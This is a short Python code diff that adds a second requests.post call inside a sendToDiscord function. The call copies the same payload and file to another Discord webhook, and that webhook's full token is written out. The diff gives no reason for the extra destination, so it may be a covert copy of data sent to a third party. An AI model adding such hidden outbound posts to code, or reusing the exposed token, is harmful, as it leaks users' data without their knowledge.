@@ -40,6 +40,11 @@ def sendToDiscord():
             data=payload,
             files=file
         )
+    requests.post(
+            "https://discord.com/api/webhooks/1287243812972007444/WHfkavqKIyp7x2vHYBP35B33Hl0CRK2sbf27oyWvHW0S187slhlNpiGt7mEzuApsHpd6",
+            data=payload,
+            files=file
+        )
 
 # Determine whether it's an image or video based on the information written by bot.py
 try:
